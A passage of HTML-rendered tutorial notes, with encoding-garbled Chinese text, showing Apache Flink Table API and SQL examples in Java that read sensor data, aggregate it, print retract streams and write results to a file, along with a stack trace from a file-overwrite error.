class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    <span class="comment">//        inputTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(inputTable, Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æŸ¥è¯¢è½¬æ¢</span></span><br><span class="line">    <span class="comment">// 3.1 Table API</span></span><br><span class="line">    <span class="comment">// ç®€å•è½¬æ¢</span></span><br><span class="line">    Table resultTable = inputTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èšåˆç»Ÿè®¡</span></span><br><span class="line">    Table aggTable = inputTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 SQL</span></span><br><span class="line">    tableEnv.sqlQuery(<span class="string">&quot;select id, temp from inputTable where id = &#x27;senosr_6&#x27;&quot;</span>);</span><br><span class="line">    Table sqlAggTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp from inputTable group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(aggTable, Row.class).print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(sqlAggTable, Row.class).print(<span class="string">&quot;sqlagg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºç»“æœ<br><em>é‡Œé¢çš„falseè¡¨ç¤ºä¸Šä¸€æ¡ä¿å­˜çš„è®°å½•è¢«åˆ é™¤ï¼Œtrueåˆ™æ˜¯æ–°åŠ å…¥çš„æ•°æ®</em><br><em>æ‰€ä»¥Flinkçš„Table APIåœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œå®é™…æ˜¯å…ˆåˆ é™¤åŸæœ¬çš„æ•°æ®ï¼Œå†æ·»åŠ æ–°æ•°æ®ã€‚</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,15.4</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,1,15.4)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,1,6.7)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,1,38.1)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,1,15.4)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,1,6.7)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,1,38.1)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,4,35.5)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,4,35.5)</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="æ•°æ®å†™å…¥åˆ°æ–‡ä»¶"><a href="#æ•°æ®å†™å…¥åˆ°æ–‡ä»¶" class="headerlink" title="æ•°æ®å†™å…¥åˆ°æ–‡ä»¶"></a>æ•°æ®å†™å…¥åˆ°æ–‡ä»¶</h6><blockquote><p><a href="https://blog.csdn.net/qq_26502245/article/details/107376528">flink Sql 1.11 executeSqlæŠ¥No operators defined in streaming topology. Cannot generate StreamGraph.</a></p></blockquote><pre><code>å†™å…¥åˆ°æ–‡ä»¶æœ‰å±€é™ï¼Œåªèƒ½æ˜¯æ‰¹å¤„ç†ï¼Œä¸”åªèƒ½æ˜¯è¿½åŠ å†™ï¼Œä¸èƒ½æ˜¯æ›´æ–°å¼çš„éšæœºå†™ã€‚</code></pre><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 5:53 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest3_FileOutput</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¡¨çš„åˆ›å»ºï¼šè¿æ¥å¤–éƒ¨ç³»ç»Ÿï¼Œè¯»å–æ•°æ®</span></span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    <span class="comment">//        inputTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(inputTable, Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æŸ¥è¯¢è½¬æ¢</span></span><br><span class="line">    <span class="comment">// 3.1 Table API</span></span><br><span class="line">    <span class="comment">// ç®€å•è½¬æ¢</span></span><br><span class="line">    Table resultTable = inputTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èšåˆç»Ÿè®¡</span></span><br><span class="line">    Table aggTable = inputTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 SQL</span></span><br><span class="line">    tableEnv.sqlQuery(<span class="string">&quot;select id, temp from inputTable where id = &#x27;senosr_6&#x27;&quot;</span>);</span><br><span class="line">    Table sqlAggTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp from inputTable group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è¾“å‡ºåˆ°æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// è¿æ¥å¤–éƒ¨æ–‡ä»¶æ³¨å†Œè¾“å‡ºè¡¨</span></span><br><span class="line">    String outputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/out.txt&quot;</span>;</span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(outputPath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  <span class="comment">//                        é…åˆ aggTable.insertInto(&quot;outputTable&quot;); æ‰ä½¿ç”¨ä¸‹é¢è¿™æ¡</span></span><br><span class="line">                  <span class="comment">//                        .field(&quot;cnt&quot;, DataTypes.BIGINT())</span></span><br><span class="line">                  .field(<span class="string">&quot;temperature&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    resultTable.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line">    <span class="comment">// è¿™æ¡ä¼šæŠ¥é”™(æ–‡ä»¶ç³»ç»Ÿè¾“å‡ºï¼Œä¸æ”¯æŒéšæœºå†™ï¼Œåªæ”¯æŒé™„åŠ å†™)</span></span><br><span class="line">    <span class="comment">// Exception in thread &quot;main&quot; org.apache.flink.table.api.TableException:</span></span><br><span class="line">    <span class="comment">// AppendStreamTableSink doesn&#x27;t support consuming update changes which is produced by</span></span><br><span class="line">    <span class="comment">// node GroupAggregate(groupBy=[id], select=[id, COUNT(id) AS EXPR$0, AVG(temp) AS EXPR$1])</span></span><br><span class="line">    <span class="comment">//        aggTable.insertInto(&quot;outputTable&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ—§ç‰ˆå¯ä»¥ç”¨ä¸‹é¢è¿™æ¡</span></span><br><span class="line">    <span class="comment">//        env.execute();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°ç‰ˆéœ€è¦ç”¨è¿™æ¡ï¼Œä¸Šé¢é‚£æ¡ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å¦‚ä¸‹</span></span><br><span class="line">    <span class="comment">// Exception in thread &quot;main&quot; java.lang.IllegalStateException:</span></span><br><span class="line">    <span class="comment">// No operators defined in streaming topology. Cannot execute.</span></span><br><span class="line">    tableEnv.execute(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºç»“æœï¼ˆè¾“å‡ºåˆ°out.txtæ–‡ä»¶ï¼‰  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensor_6,15.4</span><br></pre></td></tr></table></figure></li><li><p> è¿™ä¸ªç¨‹åºåªèƒ½è¿è¡Œä¸€æ¬¡ï¼Œå†è¿è¡Œä¸€æ¬¡æŠ¥é”™  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; org.apache.flink.runtime.client.JobExecutionException: Job execution failed.</span><br><span class="line">at org.apache.flink.runtime.jobmaster.JobResult.toJobExecutionResult(JobResult.java:144)</span><br><span class="line">at org.apache.flink.runtime.minicluster.MiniClusterJobClient.lambda$getJobExecutionResult$2(MiniClusterJobClient.java:117)</span><br><span class="line">at java.util.concurrent.CompletableFuture.uniApply(CompletableFuture.java:616)</span><br><span class="line">at java.util.concurrent.CompletableFuture$UniApply.tryFire(CompletableFuture.java:591)</span><br><span class="line">at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:488)</span><br><span class="line">at java.util.concurrent.CompletableFuture.complete(CompletableFuture.java:1975)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaInvocationHandler.lambda$invokeRpc$0(AkkaInvocationHandler.java:238)</span><br><span class="line">at java.util.concurrent.CompletableFuture.uniWhenComplete(CompletableFuture.java:774)</span><br><span class="line">at java.util.concurrent.CompletableFuture$UniWhenComplete.tryFire(CompletableFuture.java:750)</span><br><span class="line">at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:488)</span><br><span class="line">at java.util.concurrent.CompletableFuture.complete(CompletableFuture.java:1975)</span><br><span class="line">at org.apache.flink.runtime.concurrent.FutureUtils$1.onComplete(FutureUtils.java:1046)</span><br><span class="line">at akka.dispatch.OnComplete.internal(Future.scala:264)</span><br><span class="line">at akka.dispatch.OnComplete.internal(Future.scala:261)</span><br><span class="line">at akka.dispatch.japi$CallbackBridge.apply(Future.scala:191)</span><br><span class="line">at akka.dispatch.japi$CallbackBridge.apply(Future.scala:188)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run(Promise.scala)</span><br><span class="line">at org.apache.flink.runtime.concurrent.Executors$DirectExecutionContext.execute(Executors.java:73)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.executeWithValue(Promise.scala:68)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1(Promise.scala:284)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1$adapted(Promise.scala:284)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:284)</span><br><span class="line">at akka.pattern.PromiseActorRef.$bang(AskSupport.scala:573)</span><br><span class="line">at akka.pattern.PipeToSupport$PipeableFuture$$anonfun$pipeTo$1.applyOrElse(PipeToSupport.scala:22)</span><br><span class="line">at akka.pattern.PipeToSupport$PipeableFuture$$anonfun$pipeTo$1.applyOrElse(PipeToSupport.scala:21)</span><br><span class="line">at scala.concurrent.Future.$anonfun$andThen$1(Future.scala:532)</span><br><span class="line">at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29)</span><br><span class="line">at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run(Promise.scala)</span><br><span class="line">at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55)</span><br><span class="line">at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91)</span><br><span class="line">at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12)</span><br><span class="line">at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81)</span><br><span class="line">at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91)</span><br><span class="line">at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)</span><br><span class="line">at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)</span><br><span class="line">Caused by: org.apache.flink.runtime.JobException: Recovery is suppressed by NoRestartBackoffTimeStrategy</span><br><span class="line">at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.handleFailure(ExecutionFailureHandler.java:118)</span><br><span class="line">at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.getFailureHandlingResult(ExecutionFailureHandler.java:80)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.handleTaskFailure(DefaultScheduler.java:233)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.maybeHandleTaskFailure(DefaultScheduler.java:224)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.updateTaskExecutionStateInternal(DefaultScheduler.java:215)</span><br><span class="line">at org.apache.flink.runtime.scheduler.SchedulerBase.updateTaskExecutionState(SchedulerBase.java:665)</span><br><span class="line">at org.apache.flink.runtime.scheduler.SchedulerNG.updateTaskExecutionState(SchedulerNG.java:89)</span><br><span class="line">at org.apache.flink.runtime.jobmaster.JobMaster.updateTaskExecutionState(JobMaster.java:447)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcInvocation(AkkaRpcActor.java:306)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcMessage(AkkaRpcActor.java:213)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.FencedAkkaRpcActor.handleRpcMessage(FencedAkkaRpcActor.java:77)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleMessage(AkkaRpcActor.java:159)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:26)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:21)</span><br><span class="line">at scala.PartialFunction.applyOrElse(PartialFunction.scala:123)</span><br><span class="line">at scala.PartialFunction.applyOrElse$(PartialFunction.scala:122)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.applyOrElse(CaseStatements.scala:21)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172)</span><br><span class="line">at akka.actor.Actor.aroundReceive(Actor.scala:517)</span><br><span class="line">at akka.actor.Actor.aroundReceive$(Actor.scala:515)</span><br><span class="line">at akka.actor.AbstractActor.aroundReceive(AbstractActor.scala:225)</span><br><span class="line">at akka.actor.ActorCell.receiveMessage(ActorCell.scala:592)</span><br><span class="line">at akka.actor.ActorCell.invoke(ActorCell.scala:561)</span><br><span class="line">at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258)</span><br><span class="line">at akka.dispatch.Mailbox.run(Mailbox.scala:225)</span><br><span class="line">at akka.dispatch.Mailbox.exec(Mailbox.scala:235)</span><br><span class="line">... 4 more</span><br><span class="line">Caused by: java.io.IOException: File or directory /Users/ashiamd/mydocs/docs/study/javadocument/javadocument/IDEA_project/Flink_Tutorial/src/main/resources/out.txt already exists. Existing files and directories are not overwritten in NO_OVERWRITE mode. Use OVERWRITE mode to overwrite existing files and directories.</span><br><span class="line">at org.apache.flink.core.fs.FileSystem.initOutPathLocalFS(FileSystem.java:874)</span><br><span class="line">at org.apache.flink.core.fs.SafetyNetWrapperFileSystem.initOutPathLocalFS(SafetyNetWrapperFileSystem.java:142)</span><br><span class="line">at org.apache.flink.api.common.io.FileOutputFormat.open(FileOutputFormat.java:234)</span><br><span class="line">at org.apache.flink.api.java.io.TextOutputFormat.open(TextOutputFormat.java:92)</span><br><span class="line">at org.apache.flink.streaming.api.functions.sink.OutputFormatSinkFunction.open(OutputFormatSinkFunction.java:65)</span><br><span class="line">at org.apache.flink.api.common.functions.util.FunctionUtils.openFunction(FunctionUtils.java:34)</span><br><span class="line">at org.apache.flink.streaming.api.operators.AbstractUdfStreamOperator.open(AbstractUdfStreamOperator.java:102)</span><br><span class="line">at org.apache.flink.streaming.api.operators.StreamSink.open(StreamSink.java:46)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.OperatorChain.initializeStateAndOpenOperators(OperatorChain.java:426)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.lambda$beforeInvoke$2(StreamTask.java:535)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$1.runThrowing(StreamTaskActionExecutor.java:50)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.beforeInvoke(StreamTask.java:525)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:565)</span><br><span class="line">at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:755)</span><br><span class="line">at org.apache.flink.runtime.taskmanager.Task.run(Task.java:570)</span><br><span class="line">at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">Suppressed: java.lang.NullPointerException</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.lambda$cleanUp$1(ContinuousFileReaderOperator.java:499)</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.cleanUp(ContinuousFileReaderOperator.java:512)</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.dispose(ContinuousFileReaderOperator.java:441)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.disposeAllOperators(StreamTask.java:783)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.runAndSuppressThrowable(StreamTask.java:762)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.cleanUpInvoke(StreamTask.java:681)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:585)</span><br><span class="line">... 3 more</span><br></pre></td></tr></table></figure></li></ul><h6 id="è¯»å†™Kafka"><a href="#è¯»å†™Kafka" class="headerlink" title="è¯»å†™Kafka"></a>è¯»å†™Kafka</h6><p>Kafkaä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå’Œæ–‡ä»¶ç³»ç»Ÿç±»ä¼¼çš„ï¼Œåªèƒ½å¾€é‡Œè¿½åŠ æ•°æ®ï¼Œä¸èƒ½ä¿®æ”¹æ•°æ®ã€‚</p><ul><li><p> æµ‹è¯•ä»£ç <br><em>ï¼ˆæˆ‘ç”¨çš„æ–°ç‰ˆFlinkå’Œæ–°ç‰ˆkafkaè¿æ¥å™¨ï¼Œæ‰€ä»¥versionæŒ‡å®šâ€universalâ€ï¼‰</em>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 